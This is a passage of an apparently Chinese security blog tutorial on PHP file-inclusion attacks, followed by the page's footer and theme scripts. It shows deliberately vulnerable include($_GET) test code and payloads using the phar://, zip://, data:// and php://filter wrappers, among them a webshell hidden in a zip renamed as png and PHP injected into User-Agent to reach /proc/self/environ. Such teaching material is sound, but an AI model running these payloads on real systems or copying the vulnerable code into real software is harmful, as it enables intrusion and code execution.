+<h3 id="phar-伪协议"><a href="#phar-伪协议" class="headerlink" title="phar://伪协议"></a>phar://伪协议</h3><p>这个参数是就是php解压缩包的一个函数，不管后缀是什么，都会当做压缩包来解压。</p>
+<p><strong>用法：</strong></p>
+<pre><code>?file=phar://压缩包/内部文件 phar://xxx.png/shell.php 
+
+注意： PHP &gt; =5.3.0 压缩包需要是zip协议压缩，rar不行，将木马文件压缩后，改为其他任意格式的文件都可以正常使用。 步骤： 写一个一句话木马文件shell.php，然后用zip协议压缩为shell.zip，然后将后缀改为png等其他格式。 </code></pre>
+<p><strong>测试代码：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $filename  &#x3D; $_GET[&#39;filename&#39;];</span><br><span class="line">    include($filename);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/09/20/file-contant-leak/1535362303_5b83c4ff6a90e.png"></p>
+<h3 id="zip-伪协议"><a href="#zip-伪协议" class="headerlink" title="zip://伪协议"></a>zip://伪协议</h3><p>zip伪协议和phar协议类似，但是用法不一样。</p>
+<p><strong>用法：</strong></p>
+<pre><code>?file=zip://[压缩文件绝对路径]#[压缩文件内的子文件名] zip://xxx.png#shell.php。
+
+条件： PHP &gt; =5.3.0，注意在windows下测试要5.3.0&lt;PHP&lt;5.4 才可以 #在浏览器中要编码为%23，否则浏览器默认不会传输特殊字符。
+测试代码：</code></pre>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $filename  &#x3D; $_GET[&#39;filename&#39;];</span><br><span class="line">    include($filename);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/09/20/file-contant-leak/1535362318_5b83c50e8872e.png"></p>
+<h2 id="文件包含的一些骚操作"><a href="#文件包含的一些骚操作" class="headerlink" title="文件包含的一些骚操作"></a>文件包含的一些骚操作</h2><h3 id="包含一些敏感文件"><a href="#包含一些敏感文件" class="headerlink" title="包含一些敏感文件"></a>包含一些敏感文件</h3><p><code>/proc/self/environ</code>文件：</p>
+<p>向User-Agent头中注入PHP代码，包含成功就能得到shell</p>
+<p>这个 self 不要以为就是 self 文件夹，实际上子目录/proc/self本身就是当前运行进程 PID</p>
+<h3 id="贪婪包含"><a href="#贪婪包含" class="headerlink" title="贪婪包含"></a>贪婪包含</h3><p>一个payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?img&#x3D;php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;..&#x2F;flag.php|jpg</span><br></pre></td></tr></table></figure>
+
+<h3 id="data-协议"><a href="#data-协议" class="headerlink" title="data://协议"></a>data://协议</h3><p><em>利用条件：</em></p>
+<p>1、php 版本大于等于 php5.2</p>
+<p>2、allow_url_fopen = On</p>
+<p>3、allow_url_include = On</p>
+<p>利用 data:// 伪协议进行代码执行的思路原理和 php:// 是类似的，都是利用了 PHP 中的流的概念，将原本的 include 的文件流重定向到了用户可控制的输入流中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;data:text&#x2F;plain,&lt;?php phpinfo();?&gt;</span><br><span class="line">?file&#x3D;data:text&#x2F;plain;base64,base64编码的payload</span><br><span class="line">index.php?file&#x3D;data:text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br></pre></td></tr></table></figure>
+
+<p>加号 + 的 url 编码为 %2b，<code>PD9waHAgcGhwaW5mbygpOz8+</code> 的 base64 解码为：<code>&lt;?php phpinfo();?&gt;</code></p>
+<h3 id="路径长度截断-1"><a href="#路径长度截断-1" class="headerlink" title="路径长度截断"></a>路径长度截断</h3><p>这个要求php版本&lt; 5.3.10</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($_GET[<span class="string">&quot;file&quot;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&#x27;../flag.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $filename=<span class="string">&#x27;pages/&#x27;</span>.(<span class="keyword">isset</span>($_GET[<span class="string">&quot;file&quot;</span>])?$_GET[<span class="string">&quot;file&quot;</span>]:<span class="string">&quot;welcome.txt&quot;</span>).<span class="string">&#x27;.html&#x27;</span>; </span><br><span class="line"> </span><br><span class="line"><span class="keyword">include</span> $filename;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>flag 文件放在上层目录 这时我们可以使用字符 <code>./.</code> 和 <code>./</code> 来进行绕过，因为文件路径有长度限制</p>
+<p><code>windows 259 个 bytes</code></p>
+<p><code>linux 4096 个 bytes</code></p>
+<p>参考：<br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/182280.html">https://www.freebuf.com/articles/web/182280.html</a></p>
+
+          
+            <div class='article_footer'>
+              
+                
+  
+    
+    
+
+
+
+  
+
+  
+    
+    
+
+
+
+  
+
+  
+    
+    
+
+<section class="widget copyright  desktop mobile">
+  <div class='content'>
+    
+      <blockquote>
+        
+          
+            <p>本文永久链接是：<a href=http://www.m00nback.xyz/2019/09/20/file-contant-leak/>http://www.m00nback.xyz/2019/09/20/file-contant-leak/</a></p>
+          
+        
+      </blockquote>
+    
+  </div>
+</section>
+
+  
+
+  
+
+
+              
+            </div>
+          
+        </div>
+        
+          
+
+
+  <section class='meta' id="footer-meta">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-02-16T15:16:09+08:00">
+  <a class='notlink'>
+    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：2020年2月16日</p>
+  </a>
+</div>
+
+        
+      
+        
+          
+  
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/web/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>web</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>文件包含</p></a></div>
+
+
+        
+      
+        
+          
+
+        
+      
+        
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
+    
+      
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.m00nback.xyz/2019/09/20/file-contant-leak/&title=文件包含漏洞及利用方式 - 明月归的小站&summary=本篇博客主要介绍了文件包含漏洞及利用方式！"
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qq.png">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://www.m00nback.xyz/2019/09/20/file-contant-leak/&title=文件包含漏洞及利用方式 - 明月归的小站&summary=本篇博客主要介绍了文件包含漏洞及利用方式！"
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qzone.png">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.m00nback.xyz/2019/09/20/file-contant-leak/&title=文件包含漏洞及利用方式 - 明月归的小站&summary=本篇博客主要介绍了文件包含漏洞及利用方式！"
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/weibo.png">
+          
+        </a>
+      
+    
+  </div>
+</div>
+
+
+
+        
+      
+    </div>
+  </section>
+
+
+        
+        
+          <div class="prev-next">
+            
+              <a class='prev' href='/2019/09/25/php-function-leak/'>
+                <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>php一些常见函数漏洞</p>
+                <p class='content'>本篇博客介绍了php的一些常见函数的漏洞！
+
+
+md5()函数md5弱比较PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如...</p>
+              </a>
+            
+            
+              <a class='next' href='/2019/09/10/file-upload-leak/'>
+                <p class='title'>文件上传及其利用方式<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
+                <p class='content'>本篇博客主要介绍了文件上传漏洞及一些常见的利用方式，包括一些简单的绕过方式，一些常见的网站容器解析漏洞，以及图片马的制作和使用等等！
+
+
+简介文件上传漏洞是指对用户文件上传部分的控制不足或者处理...</p>
+              </a>
+            
+          </div>
+        
+      </section>
+    </article>
+  
+
+  
+    
+
+  <article class="post white-box reveal comments shadow">
+    <section class="article typo">
+      <p ct><i class='fas fa-comments'></i> 评论</p>
+      
+      <section id="comments">
+        <div id="valine_container" class="valine_thread">
+  <i class="fas fa-cog fa-spin fa-fw fa-2x"></i>
+</div>
+
+      </section>
+    </section>
+  </article>
+
+
+  
+
+
+
+
+<!-- 根据页面mathjax变量决定是否加载MathJax数学公式js -->
+
+
+</div>
+<aside class='l_side'>
+  
+  
+
+  
+    
+    
+
+
+
+  <section class="widget toc-wrapper shadow desktop mobile" id="toc-div" >
+    
+  <header>
+    
+      <i class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+    
+  </header>
+
+
+    <div class='content'>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%89%E5%85%B3%E5%8C%85%E5%90%AB%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-text">有关包含的函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%ABLFI-Local-File-Inclusion"><span class="toc-text">本地包含LFI(Local File Inclusion)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E9%99%90%E5%88%B6%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-text">无限制本地文件包含漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-text">session文件包含漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89%E9%99%90%E5%88%B6%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87"><span class="toc-text">有限制本地文件包含漏洞绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#00%E6%88%AA%E6%96%AD"><span class="toc-text">%00截断</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B7%AF%E5%BE%84%E9%95%BF%E5%BA%A6%E6%88%AA%E6%96%AD"><span class="toc-text">路径长度截断</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%82%B9%E5%8F%B7%E6%88%AA%E6%96%AD"><span class="toc-text">点号截断</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E5%8C%85%E5%90%ABRFI-Remote-File-Inclusion"><span class="toc-text">远程包含RFI(Remote File Inclusion)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E9%99%90%E5%88%B6%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-text">无限制远程文件包含漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89%E9%99%90%E5%88%B6%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87"><span class="toc-text">有限制远程文件包含漏洞绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%97%AE%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-text">问号绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-text">#号绕过</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-text">php伪协议</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95"><span class="toc-text">目录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php-%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E6%B5%81"><span class="toc-text">php:&#x2F;&#x2F; 输入输出流</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php-filter%EF%BC%88%E6%9C%AC%E5%9C%B0%E7%A3%81%E7%9B%98%E6%96%87%E4%BB%B6%E8%BF%9B%E8%A1%8C%E8%AF%BB%E5%8F%96%EF%BC%89"><span class="toc-text">php:&#x2F;&#x2F;filter（本地磁盘文件进行读取）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php-input"><span class="toc-text">php:&#x2F;&#x2F;input</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php-input-%EF%BC%88%E8%AF%BB%E5%8F%96POST%E6%95%B0%E6%8D%AE%EF%BC%89"><span class="toc-text">php:&#x2F;&#x2F;input （读取POST数据）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php-input%EF%BC%88%E5%86%99%E5%85%A5%E6%9C%A8%E9%A9%AC%EF%BC%89"><span class="toc-text">php:&#x2F;&#x2F;input（写入木马）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php-input%EF%BC%88%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%89"><span class="toc-text">php:&#x2F;&#x2F;input（命令执行）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#file-%E4%BC%AA%E5%8D%8F%E8%AE%AE-%EF%BC%88%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%EF%BC%89"><span class="toc-text">file:&#x2F;&#x2F;伪协议 （读取文件内容）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#data-%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-text">data:&#x2F;&#x2F;伪协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#phar-%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-text">phar:&#x2F;&#x2F;伪协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#zip-%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-text">zip:&#x2F;&#x2F;伪协议</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E4%BA%9B%E9%AA%9A%E6%93%8D%E4%BD%9C"><span class="toc-text">文件包含的一些骚操作</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8C%85%E5%90%AB%E4%B8%80%E4%BA%9B%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6"><span class="toc-text">包含一些敏感文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B4%AA%E5%A9%AA%E5%8C%85%E5%90%AB"><span class="toc-text">贪婪包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#data-%E5%8D%8F%E8%AE%AE"><span class="toc-text">data:&#x2F;&#x2F;协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B7%AF%E5%BE%84%E9%95%BF%E5%BA%A6%E6%88%AA%E6%96%AD-1"><span class="toc-text">路径长度截断</span></a></li></ol></li></ol>
+    </div>
+  </section>
+
+
+  
+
+
+</aside>
+
+
+
+    </div>
+    
+  
+  <footer class="clearfix">
+    <br><br>
+    
+      
+        <br>
+        <div class="social-wrapper">
+          
+            
+              <a href="/atom.xml"
+                class="social fas fa-rss flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+              <a href="mailto:3300162791@qq.com"
+                class="social fas fa-envelope flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+              <a href="https://github.com/BeyondOneself"
+                class="social fab fa-github flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+          
+        </div>
+      
+    
+      
+        <div><p>博客内容遵循 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</a></p>
+</div>
+      
+    
+      
+        本站使用
+        <a href="https://github.com/volantis-x/hexo-theme-volantis/releases/tag/3.0.0" target="_blank" class="codename">Volantis</a>
+        作为主题，总访问量为
+          <span id="busuanzi_value_site_pv"><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
+          次
+        
+      
+    
+      
+        <div class='copyright'>
+        <p><a href="/">Copyright © 2019-2020</a></p>
+
+        </div>
+      
+    
+  </footer>
+
+
+    <a class="s-top fas fa-arrow-up fa-fw" href='javascript:void(0)'></a>
+  </div>
+  <div>
+    
+    
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.5/dist/jquery.min.js"></script>
+
+
+
+  <script>
+    
+    var SEARCH_SERVICE = "hexo" || "hexo";
+    var ROOT = "/" || "/";
+    if (!ROOT.endsWith('/')) ROOT += '/';
+  </script>
+
+
+
+  <script async src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@2/js/instant_page.js" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+
+
+
+  
+  
+  
+    
+<script src="https://cdn.jsdelivr.net/npm/jquery-backstretch@2.1.18/jquery.backstretch.min.js"></script>
+
+    <script type="text/javascript">
+      $(function(){
+        var imgs=["https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/001.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/002.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/003.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/004.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/005.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/006.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/012.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/016.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/019.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/033.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/034.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/035.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/038.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/039.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/042.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/046.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/051.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/052.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/054.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/056.jpg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/41F215B9-261F-48B4-80B5-4E86E165259E.jpeg"];
+        if ('true' == 'true') {
+          function shuffle(arr){
+            /*From countercurrent-time*/
+            var n = arr.length;
+            while(n--) {
+              var index = Math.floor(Math.random() * n);
+              var temp = arr[index];
+              arr[index] = arr[n];
+              arr[n] = temp;
+            }
+          }
+          shuffle(imgs);
+        }
+        if ('.cover') {
+          $('.cover').backstretch(
+            imgs,
+          {
+            duration: "20000",
+            fade: "1500"
+          });
+        } else {
+          $.backstretch(
+            imgs,
+          {
+            duration: "20000",
+            fade: "1500"
+          });
+        }
+      });
+    </script>
+  
+
+
+
+
+
+
+  
+  
+<script src="/js/valine.js"></script>
+
+
+<script>
+  var GUEST_INFO = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link'.split(',').filter(function (item) {
+    return GUEST_INFO.indexOf(item) > -1
+  });
+  var REQUIRED_FIELDS = ['nick', 'mail', 'link'];
+  var requiredFields = 'nick,mail'.split(',').filter(function (item) {
+    return REQUIRED_FIELDS.indexOf(item) > -1
+  });
+
+  function emoji(path, idx, ext) {
+    return path + "/" + path + "-" + idx + "." + ext;
+  }
+
+  var emojiMaps = {};
+  for (var i = 1; i <= 54; i++) {
+    emojiMaps['tieba-' + i] = emoji('tieba', i, 'png');
+  }
+  for (var i = 1; i <= 101; i++) {
+    emojiMaps['qq-' + i] = emoji('qq', i, 'gif');
+  }
+  for (var i = 1; i <= 116; i++) {
+    emojiMaps['aru-' + i] = emoji('aru', i, 'gif');
+  }
+  for (var i = 1; i <= 125; i++) {
+    emojiMaps['twemoji-' + i] = emoji('twemoji', i, 'png');
+  }
+  for (var i = 1; i <= 4; i++) {
+    emojiMaps['weibo-' + i] = emoji('weibo', i, 'png');
+  }
+
+  function pjax_valine() {
+    let pageUrl = $.trim($('#pjax-comment-path').text()) === "none" ? 
+      decodeURI(window.location.pathname) : $.trim($('#pjax-comment-path').text());
+    let pagePlaceholder = $.trim($('#pjax-comment-placeholder').text()) === "none" ?
+      "快来评论吧~" : $.trim($('#pjax-comment-placeholder').text());
+
+    let ALLPATH = '';
+    if(ALLPATH != '') pageUrl = ALLPATH;
+
+    var valine = new Valine();
+    valine.init({
+      el: '#valine_container',
+      meta: meta,
+      placeholder: pagePlaceholder,
+      path: pageUrl,
+      appId: "or2NepulP8NGKXehq1IRSQTc-gzGzoHsz",
+      appKey: "lRlc11XLlqK4AeDJeNJxo17y",
+      pageSize: '10',
+      avatar: 'robohash',
+      lang: 'zh-cn',
+      visitor: 'true',
+      highlight: 'true',
+      mathJax: 'false',
+      enableQQ: 'true',
+      requiredFields: requiredFields,
+      emojiCDN: 'https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/valine/',
+      emojiMaps: emojiMaps
+    })
+  }
+
+  $(function () {
+    pjax_valine();
+  });
+</script>
+
+
+
+
+<!-- darkmodejs -->
+
+
+<!-- 复制 -->
+
+  <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+    var clipboard = new ClipboardJS('.btn-copy', {
+        target: function (trigger) {
+            return trigger.nextElementSibling
+        }
+    });
+    function wait(callback, seconds) {
+        var timelag = null;
+        timelag = window.setTimeout(callback, seconds)
+    }
+    function pjax_initCopyCode() {
+        var copyHtml = '';
+        copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+        copyHtml += '<i class="fas fa-copy"></i><span>COPY</span>';
+        copyHtml += '</button>';
+        $(".highlight .code pre").before(copyHtml);
+        $(".article pre code").before(copyHtml);
+        clipboard.off('success').on('success', function (e) {
+            let $btn = $(e.trigger);
+            $btn.addClass('copied');
+            let $icon = $($btn.find('i'));
+            $icon.removeClass('fa-copy');
+            $icon.addClass('fa-check-circle');
+            let $span = $($btn.find('span'));
+            $span[0].innerText = 'COPIED';
+            wait(function () {
+                $icon.removeClass('fa-check-circle');
+                $icon.addClass('fa-copy');
+                $span[0].innerText = 'COPY'
+            }, 2000)
+        });
+        clipboard.off('error').on('error', function (e) {
+            e.clearSelection();
+            let $btn = $(e.trigger);
+            $btn.addClass('copy-failed');
+            let $icon = $($btn.find('i'));
+            $icon.removeClass('fa-copy');
+            $icon.addClass('fa-times-circle');
+            let $span = $($btn.find('span'));
+            $span[0].innerText = 'COPY FAILED';
+            wait(function () {
+                $icon.removeClass('fa-times-circle');
+                $icon.addClass('fa-copy');
+                $span[0].innerText = 'COPY'
+            }, 2000)
+        })
+    }
+    $(function () {
+        pjax_initCopyCode()
+    });
+</script>
+
+
+<!-- scrollreveal -->
+
+  <script src="https://cdn.jsdelivr.net/npm/scrollreveal@4.0.6/dist/scrollreveal.min.js"></script>
+  <script type="text/javascript">
+    function pjax_scrollrebeal() {
+      ScrollReveal().reveal('.l_main .reveal', {
+        distance: '32px',
+        duration: '800',
+        interval: '20',
+        scale: '1',
+        easing: 'ease-out'
+      });
+    }
+
+    $(function () {
+      pjax_scrollrebeal();
+    });
+  </script>
+
+<!-- ******************************** -->
+
+<!-- fancybox -->
+<script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+<script>
+  function pjax_fancybox() {
+    $(".article-entry").find("img").not('.inline').not('a img').each(function () { //渲染 fancybox
+      var element = document.createElement("a"); // a 标签
+      $(element).attr("class", "fancybox");
+      $(element).attr("pjax-fancybox", "");  // 过滤 pjax
+      $(element).attr("href", $(this).attr("src"));
+      if ($(this).attr("data-original")) {
+        $(element).attr("href", $(this).attr("data-original"));
+      }
+      $(element).attr("data-fancybox", "images");
+      var caption = "";   // 描述信息
+      if ($(this).attr('alt')) {  // 判断当前页面是否存在描述信息
+        $(element).attr('data-caption', $(this).attr('alt'));
+        caption = $(this).attr('alt');
+      }
+      var div = document.createElement("div");
+      $(div).addClass("fancybox");
+      $(this).wrap(div); // 最外层套 div ，其实主要作用还是 class 样式
+      var span = document.createElement("span");
+      $(span).addClass("image-caption");
+      $(span).text(caption); // 加描述
+      $(this).after(span);  // 再套一层描述
+      $(this).wrap(element);  // 最后套 a 标签
+    })
+    $(".article-entry").find("img").fancybox({
+      selector: '[data-fancybox="images"]',
+      hash: false,
+      loop: false,
+      closeClick: true,
+      helpers: {
+        overlay: {closeClick: true}
+      },
+      buttons: [
+        "zoom",
+        "close"
+      ]
+    });
+  };
+  $(function () {
+    pjax_fancybox();
+  });
+</script>
+
+<!-- ******************************** -->
+
+
+  
+<script src="/js/app.js"></script>
+
+
+
+
+  
+    
+<script src="/js/search.js"></script>
+
+  
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-busuanzi@2.3/js/busuanzi.pure.mini.js" data-pjax></script>
+
+
+
+  
+<script src="https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.js"></script>
+
+  <script type="text/javascript">
+    $(function () {
+      Waves.attach('.flat-btn', ['waves-button']);
+      Waves.attach('.float-btn', ['waves-button', 'waves-float']);
+      Waves.attach('.float-btn-light', ['waves-button', 'waves-float', 'waves-light']);
+      Waves.attach('.flat-box', ['waves-block']);
+      Waves.attach('.float-box', ['waves-block', 'waves-float']);
+      Waves.attach('.waves-image');
+      Waves.init();
+    });
+  </script>
+
+
+
+  
+<script src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@2/js/comment_typing.js"></script>
+
+
+
+
+
+
+
+    
+      
+
+
+<script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script>
+
+<!-- 样式位于：source/css/_third-party/pjaxanimate.styl -->
+
+<div class="pjax-animate">
+  
+    <script src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>
+    <div id="loading-bar-wrapper"><script>NProgress.configure({parent:"#loading-bar-wrapper",trickleSpeed: 100})</script></div>
+    <script>
+      window.ShowLoading = function() {
+        NProgress.start();
+      };
+      window.HideLoading = function() {
+        NProgress.done();
+      }
+    </script>
+  
+</div>
+
+<script>
+    var pjax;
+    document.addEventListener('DOMContentLoaded', function () {
+      pjax = new Pjax({
+        elements: 'a[href]:not([href^="#"]):not([href="javascript:void(0)"]):not([pjax-fancybox])',
+        selectors: [
+          "title",
+          "#pjax-container",
+          "#pjax-header-nav-list"
+        ],
+        cacheBust: false,   // url 地址追加时间戳，用以避免浏览器缓存
+        timeout: 5000
+      });
+    });
+
+    document.addEventListener('pjax:send', function (e) {
+      window.stop(); // 相当于点击了浏览器的停止按钮
+
+      try {
+        var currentUrl = window.location.pathname;
+        var targetUrl = e.triggerElement.href;
+        var banUrl = [""];
+        if (banUrl[0] != "") {
